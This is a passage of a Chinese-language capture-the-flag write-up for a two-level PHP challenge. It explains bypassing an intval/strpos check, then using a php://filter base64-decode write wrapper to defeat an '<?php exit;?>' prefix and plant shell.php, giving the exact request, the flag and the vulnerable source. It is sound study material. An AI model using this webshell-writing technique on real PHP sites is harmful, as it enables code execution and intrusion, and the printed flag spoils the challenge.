-<h4 id="step-6-filename-content"><a class="toclink" href="ezphp-two-levels/#step-6-filename-content">Step 6：要改的是 <code>filename</code>，不是 <code>content</code></a></h4>
-<p><strong><code>file_put_contents</code> 的第一个参数是</strong>文件名<strong>，而 PHP 的文件名支持流包装器。</strong>所以我能控制的不只是“写到哪”，还有“写入途中经过什么处理”：**</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>php://filter/write=&lt;滤镜&gt;/resource=&lt;真实路径&gt;
-</span></code></pre></div>
-<p><strong>这就是这题的突破口 —— 问题不在 <code>content</code> 装不进去，而在</strong>写入通道可以被编程<strong>。</strong></p>
-<h4 id="step-7convertbase64-decode"><a class="toclink" href="ezphp-two-levels/#step-7convertbase64-decode">Step 7：<code>convert.base64-decode</code> 把前缀变成乱码</a></h4>
-<p><strong>用 <code>convert.base64-decode</code>，数据在落盘前会先做一次 base64 解码。而 base64 解码器的规则是：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>① 只认 [A-Za-z0-9+/=]
-</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>② 其他字符（&lt; ? 空格 ; &gt;）直接丢掉
-</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>③ 剩下的每 4 个字符 → 3 字节
-</span></code></pre></div>
-<p><strong><code>&lt;?php exit;?&gt;</code> 里能留下的只有 <code>phpexit</code> —— 7 个字母：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>[&lt;] 丢弃   [?] 丢弃   [p] 留下   [h] 留下   [p] 留下
-</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>[ ] 丢弃   [e] 留下   [x] 留下   [i] 留下   [t] 留下
-</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>[;] 丢弃   [?] 丢弃   [&gt;] 丢弃
-</span></code></pre></div>
-<p><strong>留下的 7 个字母会被当成数据解码，变成 6 个乱码字节。</strong></p>
-<p><strong>最终文件变成：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>[6 字节乱码] + [我们自己的 PHP 代码]
-</span></code></pre></div>
-<p><strong>乱码里没有 <code>&lt;</code>，所以 PHP 不会在那里进入代码模式，只是把它当普通字节输出（页面顶部那几个怪字符）；后面我们自己的 <code>&lt;?php</code> 才是第一个被识别的开标签。</strong></p>
-<h4 id="step-8"><a class="toclink" href="ezphp-two-levels/#step-8">Step 8：必须补字符对齐</a></h4>
-<p><strong>base64 解码要求有效字符数是 4 的倍数。</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>7（phpexit）+ 补充字符数 + base64 长度  必须 % 4 == 0
-</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>7 + 1 + 32 = 40  ✅
-</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>7 + 5 + 32 = 44  ✅   加 5 个凑成 12 也行
-</span></code></pre></div>
-<p><strong>不足 4 的倍数，滤镜会报 <code>invalid byte sequence</code>，写入直接失败。</strong></p>
-<p><strong>所以要在 base64 前面补 1 个字符（或 5 个），跟前面的 7 个凑成 8（或 12）。</strong></p>
-<h4 id="step-9-content"><a class="toclink" href="ezphp-two-levels/#step-9-content">Step 9：把 <code>content=</code> 也编码进去 —— 我踩的第一个坑</a></h4>
-<p><strong>这里我最开始不知道在干嘛，把 <code>content=</code> 也放进去编码了，查询时一直报错，太迷了。</strong></p>
-<p><strong><code>content</code> 是</strong>字段名<strong>，必须原样出现在 body 里，不能被编码：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>content=&lt;1 个对齐字符&gt;&lt;只含 &lt;?php ... ?&gt; 的 base64&gt;
-</span></code></pre></div>
-<p><strong>如果把整段 <code>content=&lt;?php ...?&gt;</code> 都编码了，PHP 解析出来的键就是那一长串 base64，<code>$_POST['content']</code> 根本不存在 —— 后端第一句 <code>isset</code> 就 <code>exit</code> 了，页面一片空白。</strong></p>
-<h4 id="step-10"><a class="toclink" href="ezphp-two-levels/#step-10">Step 10：尾部 <code>=</code> 和 <code>+</code> 的坑</a></h4>
-<p><strong>当时遇到一个问题：用工具编码后，结尾那个字符在表单里会被改掉，导致访问文件失败。</strong></p>
-<p><strong>原因是 base64 里有两个特殊字符：</strong></p>
-<table>
-<thead>
-<tr>
-<th>字符</th>
-<th>是什么</th>
-<th>表单里会怎样</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>+</code></td>
-<td>字母表第 62 号，<strong>真实数据</strong></td>
-<td>被当成<strong>空格</strong>，整个末尾错位</td>
-</tr>
-<tr>
-<td><code>=</code></td>
-<td><strong>填充符</strong>，不是数据</td>
-<td>被某些工具当分隔符处理，删掉后末组不完整</td>
-</tr>
-</tbody>
-</table>
-<p><strong><code>?&gt;</code> 是两个字节，编成 base64 就是 <code>Pz4=</code> —— 结尾一定带 <code>=</code>。</strong></p>
-<p><strong>所以这里我就删掉了 <code>?&gt;</code>，反正单个 <code>;</code> 也能确定语句的结束。</strong></p>
-<p><strong>去掉 <code>?&gt;</code> 之后，base64 结尾是 <code>Jyk7</code>（纯字母数字），整个值里</strong>没有任何会被表单规则特殊对待的字符<strong>。</strong></p>
-<p><strong>顺带说：PHP 文件本来就不需要 <code>?&gt;</code> 结尾，官方也建议省略 —— 这一刀砍得对。</strong></p>
-<h4 id="step-11-flag"><a class="toclink" href="ezphp-two-levels/#step-11-flag">Step 11：拼起来拿 flag</a></h4>
-<p><img alt="请求体" src="../assets/images/ezphp-two-levels/02-request-body.png" /></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>GET   ?filename=php://filter/write=convert.base64-decode/resource=shell.php
-</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>POST  content=A&lt;去掉 ?&gt; 的 base64&gt;
-</span></code></pre></div>
-<p><strong>访问 <code>shell.php</code>：</strong></p>
-<p><img alt="拿到 flag" src="../assets/images/ezphp-two-levels/03-flag.png" /></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>SYC{Y0u_have_alr3ady_g0tten_started_w1th_PHP}
-</span></code></pre></div>
-<hr />
-<h3 id="_3"><a class="toclink" href="ezphp-two-levels/#_3">解题思路总结</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>第一关：
-</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>  四道检查互斥
-</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>    → 字母全禁 → 只剩八进制（0x / 0b 都要字母）
-</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>      → 但 strpos 不许 0 在第 0 位
-</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>        → 用换行符占位：intval 跳过它，strpos 数它
-</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>          → 算 411413 的八进制，拼起来，进 session
-</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>
-</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>第二关：
-</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>  file_put_contents 的 filename 可控 → 能挂流包装器
-</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a>    → 前缀 &lt;?php exit;?&gt; 会先执行 → 必须毁掉它
-</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a>      → convert.base64-decode：非字母表字符全丢，字母被解码成乱码
-</span><span id="__span-15-12"><a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a>        → 7 个字母 + 补 1 个对齐 → 前缀变成 6 字节乱码
-</span><span id="__span-15-13"><a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a>          → 文件 = 乱码 + 我们的 shell → 执行 → flag
-</span></code></pre></div>
-<h4 id="_4"><a class="toclink" href="ezphp-two-levels/#_4">漏洞原理</a></h4>
-<p><strong>① 同一个字符串，两个函数读出两种含义</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>intval($num, 0)   看"值"：跳过前导空白，按第一个字符定进制
-</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>strpos($num, "0") 看"位置"：不解析，只找下标
-</span></code></pre></div>
-<p><strong><code>"\n01443425"</code> 对前者是 411413，对后者是"0 出现在第 1 位"。两个结论都成立，检查就被夹在中间。</strong></p>
-<p><strong>② 写入通道可编程</strong></p>
-<p><strong><code>file_put_contents</code> 的文件名支持 <code>php://filter</code>，等于把"写文件"变成了"写文件前先过一道处理"。前缀防护在这种通道面前形同虚设。</strong></p>
-<p><strong>③ base64 解码器只认字母表</strong></p>
-<p><strong>它不认识 PHP，不知道 <code>&lt;?php</code> 意味着代码。它只会：字母表里的解码，字母表外的丢掉。所以 <code>&lt;?php exit;?&gt;</code> 不会被"删除"，而是被"翻译成 6 个字节的乱码"。</strong></p>
-<h4 id="_5"><a class="toclink" href="ezphp-two-levels/#_5">关键知识点</a></h4>
-<table>
-<thead>
-<tr>
-<th>知识点</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>intval($s, 0)</code></td>
-<td>base 0 = 按前缀自动判进制：<code>0x</code> 十六 / <code>0b</code> 二 / <code>0</code> 八 / 其余十</td>
-</tr>
-<tr>
-<td>前导空白</td>
-<td><code>intval</code> 跳过（<code>isspace</code>：空格 <code>\t</code> <code>\n</code> <code>\r</code>），<code>strpos</code> 不跳过</td>
-</tr>
-<tr>
-<td><code>strpos</code> 返回 0</td>
-<td><code>0</code> 是 falsy，所以 <code>!strpos(...)</code> 会把"出现在首位"和"没找到"判成同一种情况</td>
-</tr>
-<tr>
-<td><code>==</code> vs <code>intval</code></td>
-<td>弱比较走自动转换（十进制），<code>intval(,0)</code> 走显式进制解析 —— 两者可以给出不同的值</td>
-</tr>
-<tr>
-<td>流包装器</td>
-<td><code>php://filter/write=&lt;滤镜&gt;/resource=&lt;路径&gt;</code>，写入前可编程处理</td>
-</tr>
-<tr>
-<td>base64 解码规则</td>
-<td>只认 <code>[A-Za-z0-9+/=]</code>，其余丢弃；每 4 字符 → 3 字节</td>
-</tr>
-<tr>
-<td>base64 填充</td>
-<td><code>=</code> 表示最后一组没装满；删掉后严格解码器会丢掉末组</td>
-</tr>
-<tr>
-<td>表单编码</td>
-<td><code>+</code> 变空格、<code>=</code> 是分隔符 —— base64 结尾这两个字符最容易被改坏</td>
-</tr>
-<tr>
-<td><code>?&gt;</code> 可省</td>
-<td>PHP 文件末尾不需要闭合标签，官方建议省略</td>
-</tr>
-</tbody>
-</table>
-<hr />
-<details class="note">
-<summary>第一关源码</summary>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="cp">&lt;?php</span>
-</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="nb">ob_start</span><span class="p">();</span>
-</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="nb">session_start</span><span class="p">();</span>
-</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>
-</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a><span class="k">include</span><span class="p">(</span><span class="s2">"flag.php"</span><span class="p">);</span>
-</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>
-</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'num'</span><span class="p">]))</span> <span class="p">{</span>
-</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a>    <span class="k">exit</span><span class="p">;</span>
-</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a><span class="p">}</span>
-</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a>
-</span><span id="__span-17-12"><a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a><span class="nv">$num</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'num'</span><span class="p">];</span>
-</span><span id="__span-17-13"><a id="__codelineno-17-13" name="__codelineno-17-13" href="#__codelineno-17-13"></a>
-</span><span id="__span-17-14"><a id="__codelineno-17-14" name="__codelineno-17-14" href="#__codelineno-17-14"></a><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$num</span><span class="p">))</span> <span class="p">{</span>
-</span><span id="__span-17-15"><a id="__codelineno-17-15" name="__codelineno-17-15" href="#__codelineno-17-15"></a>    <span class="k">die</span><span class="p">(</span><span class="s2">"xiexie 不喜欢数组。"</span><span class="p">);</span>
-</span><span id="__span-17-16"><a id="__codelineno-17-16" name="__codelineno-17-16" href="#__codelineno-17-16"></a><span class="p">}</span>
-</span><span id="__span-17-17"><a id="__codelineno-17-17" name="__codelineno-17-17" href="#__codelineno-17-17"></a>
-</span><span id="__span-17-18"><a id="__codelineno-17-18" name="__codelineno-17-18" href="#__codelineno-17-18"></a><span class="k">if</span> <span class="p">(</span><span class="nv">$num</span> <span class="o">==</span> <span class="mi">411413</span><span class="p">)</span> <span class="p">{</span>
-</span><span id="__span-17-19"><a id="__codelineno-17-19" name="__codelineno-17-19" href="#__codelineno-17-19"></a>    <span class="k">die</span><span class="p">(</span><span class="s2">"这都无法做到吗!"</span><span class="p">);</span>
-</span><span id="__span-17-20"><a id="__codelineno-17-20" name="__codelineno-17-20" href="#__codelineno-17-20"></a><span class="p">}</span>
-</span><span id="__span-17-21"><a id="__codelineno-17-21" name="__codelineno-17-21" href="#__codelineno-17-21"></a>
-</span><span id="__span-17-22"><a id="__codelineno-17-22" name="__codelineno-17-22" href="#__codelineno-17-22"></a><span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/[a-z\.]/i"</span><span class="p">,</span> <span class="nv">$num</span><span class="p">))</span> <span class="p">{</span>
-</span><span id="__span-17-23"><a id="__codelineno-17-23" name="__codelineno-17-23" href="#__codelineno-17-23"></a>    <span class="k">die</span><span class="p">(</span><span class="s2">"xiexie感觉你应该没办法了!!"</span><span class="p">);</span>
-</span><span id="__span-17-24"><a id="__codelineno-17-24" name="__codelineno-17-24" href="#__codelineno-17-24"></a><span class="p">}</span>
-</span><span id="__span-17-25"><a id="__codelineno-17-25" name="__codelineno-17-25" href="#__codelineno-17-25"></a>
-</span><span id="__span-17-26"><a id="__codelineno-17-26" name="__codelineno-17-26" href="#__codelineno-17-26"></a><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$num</span><span class="p">,</span> <span class="s2">"0"</span><span class="p">))</span> <span class="p">{</span>
-</span><span id="__span-17-27"><a id="__codelineno-17-27" name="__codelineno-17-27" href="#__codelineno-17-27"></a>    <span class="k">die</span><span class="p">(</span><span class="s2">"玉米说以防万一再试试这个!!!"</span><span class="p">);</span>
-</span><span id="__span-17-28"><a id="__codelineno-17-28" name="__codelineno-17-28" href="#__codelineno-17-28"></a><span class="p">}</span>
-</span><span id="__span-17-29"><a id="__codelineno-17-29" name="__codelineno-17-29" href="#__codelineno-17-29"></a>
-</span><span id="__span-17-30"><a id="__codelineno-17-30" name="__codelineno-17-30" href="#__codelineno-17-30"></a><span class="k">if</span> <span class="p">(</span><span class="nb">intval</span><span class="p">(</span><span class="nv">$num</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">===</span> <span class="mi">411413</span><span class="p">)</span> <span class="p">{</span>
-</span><span id="__span-17-31"><a id="__codelineno-17-31" name="__codelineno-17-31" href="#__codelineno-17-31"></a>    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'ezphp_level1'</span><span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
-</span><span id="__span-17-32"><a id="__codelineno-17-32" name="__codelineno-17-32" href="#__codelineno-17-32"></a>    <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: death.php"</span><span class="p">);</span>
-</span><span id="__span-17-33"><a id="__codelineno-17-33" name="__codelineno-17-33" href="#__codelineno-17-33"></a>    <span class="k">exit</span><span class="p">;</span>
-</span><span id="__span-17-34"><a id="__codelineno-17-34" name="__codelineno-17-34" href="#__codelineno-17-34"></a><span class="p">}</span>
-</span><span id="__span-17-35"><a id="__codelineno-17-35" name="__codelineno-17-35" href="#__codelineno-17-35"></a>
-</span><span id="__span-17-36"><a id="__codelineno-17-36" name="__codelineno-17-36" href="#__codelineno-17-36"></a><span class="k">echo</span> <span class="s2">"&lt;p&gt;好像还差一点。&lt;/p&gt;"</span><span class="p">;</span>
-</span><span id="__span-17-37"><a id="__codelineno-17-37" name="__codelineno-17-37" href="#__codelineno-17-37"></a><span class="cp">?&gt;</span>
-</span></code></pre></div>
-</details>
-<details class="note">
-<summary>第二关源码</summary>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="cp">&lt;?php</span>
-</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="nb">session_start</span><span class="p">();</span>
-</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>
-</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'ezphp_level1'</span><span class="p">]))</span> <span class="p">{</span>
-</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>    <span class="nb">http_response_code</span><span class="p">(</span><span class="mi">404</span><span class="p">);</span>
-</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>    <span class="k">exit</span><span class="p">(</span><span class="s2">"not found"</span><span class="p">);</span>
-</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a><span class="p">}</span>
-</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a>
-</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a><span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-</span><span id="__span-18-10"><a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a>
-</span><span id="__span-18-11"><a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'content'</span><span class="p">]))</span> <span class="p">{</span>
-</span><span id="__span-18-12"><a id="__codelineno-18-12" name="__codelineno-18-12" href="#__codelineno-18-12"></a>    <span class="k">exit</span><span class="p">;</span>
-</span><span id="__span-18-13"><a id="__codelineno-18-13" name="__codelineno-18-13" href="#__codelineno-18-13"></a><span class="p">}</span>
-</span><span id="__span-18-14"><a id="__codelineno-18-14" name="__codelineno-18-14" href="#__codelineno-18-14"></a>
-</span><span id="__span-18-15"><a id="__codelineno-18-15" name="__codelineno-18-15" href="#__codelineno-18-15"></a><span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">];</span>
-</span><span id="__span-18-16"><a id="__codelineno-18-16" name="__codelineno-18-16" href="#__codelineno-18-16"></a><span class="nv">$content</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'content'</span><span class="p">];</span>
-</span><span id="__span-18-17"><a id="__codelineno-18-17" name="__codelineno-18-17" href="#__codelineno-18-17"></a>
-</span><span id="__span-18-18"><a id="__codelineno-18-18" name="__codelineno-18-18" href="#__codelineno-18-18"></a><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$content</span><span class="p">))</span> <span class="p">{</span>
-</span><span id="__span-18-19"><a id="__codelineno-18-19" name="__codelineno-18-19" href="#__codelineno-18-19"></a>    <span class="k">exit</span><span class="p">(</span><span class="s2">"说了xiexie不喜欢数组。"</span><span class="p">);</span>
-</span><span id="__span-18-20"><a id="__codelineno-18-20" name="__codelineno-18-20" href="#__codelineno-18-20"></a><span class="p">}</span>
-</span><span id="__span-18-21"><a id="__codelineno-18-21" name="__codelineno-18-21" href="#__codelineno-18-21"></a>
-</span><span id="__span-18-22"><a id="__codelineno-18-22" name="__codelineno-18-22" href="#__codelineno-18-22"></a><span class="c1">// hint：普通相对路径会写入站点根目录 /var/www/html/。</span>
-</span><span id="__span-18-23"><a id="__codelineno-18-23" name="__codelineno-18-23" href="#__codelineno-18-23"></a><span class="nv">$written</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file_put_contents</span><span class="p">(</span>
-</span><span id="__span-18-24"><a id="__codelineno-18-24" name="__codelineno-18-24" href="#__codelineno-18-24"></a>    <span class="nv">$filename</span><span class="p">,</span>
-</span><span id="__span-18-25"><a id="__codelineno-18-25" name="__codelineno-18-25" href="#__codelineno-18-25"></a>    <span class="s2">"&lt;?php exit;?&gt;"</span> <span class="o">.</span> <span class="nv">$content</span>
-</span><span id="__span-18-26"><a id="__codelineno-18-26" name="__codelineno-18-26" href="#__codelineno-18-26"></a><span class="p">);</span>
-</span><span id="__span-18-27"><a id="__codelineno-18-27" name="__codelineno-18-27" href="#__codelineno-18-27"></a>
-</span><span id="__span-18-28"><a id="__codelineno-18-28" name="__codelineno-18-28" href="#__codelineno-18-28"></a><span class="k">if</span> <span class="p">(</span><span class="nv">$written</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
-</span><span id="__span-18-29"><a id="__codelineno-18-29" name="__codelineno-18-29" href="#__codelineno-18-29"></a>    <span class="k">exit</span><span class="p">(</span><span class="s2">"写入失败。"</span><span class="p">);</span>
-</span><span id="__span-18-30"><a id="__codelineno-18-30" name="__codelineno-18-30" href="#__codelineno-18-30"></a><span class="p">}</span>
-</span><span id="__span-18-31"><a id="__codelineno-18-31" name="__codelineno-18-31" href="#__codelineno-18-31"></a>
-</span><span id="__span-18-32"><a id="__codelineno-18-32" name="__codelineno-18-32" href="#__codelineno-18-32"></a><span class="k">echo</span> <span class="s2">"xiexie吞了吞口水，他好像知道自己失败了"</span><span class="p">;</span>
-</span><span id="__span-18-33"><a id="__codelineno-18-33" name="__codelineno-18-33" href="#__codelineno-18-33"></a><span class="cp">?&gt;</span>
 </span></code></pre></div>
 </details>
     
